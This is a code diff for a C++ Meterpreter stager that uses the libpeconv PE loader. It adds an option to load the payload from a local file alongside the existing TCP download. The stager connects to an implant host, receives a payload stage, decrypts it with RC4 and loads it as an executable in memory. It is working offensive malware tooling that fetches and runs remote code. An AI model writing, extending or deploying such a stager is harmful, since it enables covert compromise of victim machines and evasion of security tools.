@@ -1,12 +1,18 @@
 /**
-A basic meterpreter protocol (TCP) stager using libpeconv PE loader (EXE/DLL)
+A basic meterpreter protocol (TCP) / local file load stager using libpeconv PE loader (EXE/DLL)
 built from: https://github.com/hasherezade/libpeconv_tpl
 
-  - featuring RC4 payload encryption support
+  - featuring RC4 payload encryption
 */
 
+#ifdef PAYLOAD_FILE
+#include <fstream>
+#endif
+
+#ifdef IMPLANT_IP
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#endif
 
 #include <windows.h>
 #include <iostream>
@@ -14,29 +20,27 @@ built from: https://github.com/hasherezade/libpeconv_tpl
 
 #include <peconv.h> // include libPeConv header
 
+#ifdef RC4_KEY
 #include "cRC4.h"
+#endif
 
-/* TCP meterpreter stager server parameters (ip, port) ::: define in Makefile */
-#ifndef IMPLANT_IP
-#define IMPLANT_IP "192.168.56.1"
-#endif
-#ifndef IMPLANT_PORT
-#define IMPLANT_PORT 8889
-#endif
 
 BYTE* g_Payload = nullptr;
 size_t g_PayloadSize = 0;
 
 void fetch_payload()
 {
+  BYTE *buf;
+  unsigned int bufsize;
+
+#ifdef IMPLANT_IP
   WSADATA wsa;
   SOCKET s;
   struct sockaddr_in cleanServer;
   int response_size;
 
-  BYTE *buf;
-  unsigned int bufsize;
-  
+  std::cout << "[*] connecting to " << IMPLANT_IP << ":" << IMPLANT_PORT << std::endl << std::flush;
+
   //Initialize Winsock
   if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
     {
@@ -67,9 +71,17 @@ void fetch_payload()
   if ((response_size = recv(s, (char*)&bufsize, 4, 0)) == SOCKET_ERROR) {
     printf("Receving data failed\n");
   }
-  
+
+#else
+  std::cout << "[*] opening file " << PAYLOAD_FILE << std::endl << std::flush;
+  std::ifstream f(PAYLOAD_FILE, std::ifstream::ate | std::ifstream::binary);
+  bufsize = f.tellg();
+  f.seekg(0, f.beg);
+#endif
   std::cout << "[*] stage size: " << bufsize << std::endl << std::flush;
   buf = (BYTE *)malloc(bufsize);
+
+#ifdef IMPLANT_IP
   std::cout << "[*] downloading stage: " << std::flush;
   
   unsigned int length = bufsize;
@@ -81,8 +93,13 @@ void fetch_payload()
     length = length - received;
     //printf(".", received);
   }
-  std::cout << "success!" << std::endl << std::flush;
   closesocket(s);
+#else
+  std::cout << "[*] reading binary data: " << std::flush;
+  f.read(reinterpret_cast<char*>(buf), bufsize);
+  f.close();
+#endif
+  std::cout << "success!" << std::endl << std::flush;
 
 #ifdef RC4_KEY
   std::cout << "[*] RC4 decrypting buffer..." << std::flush;
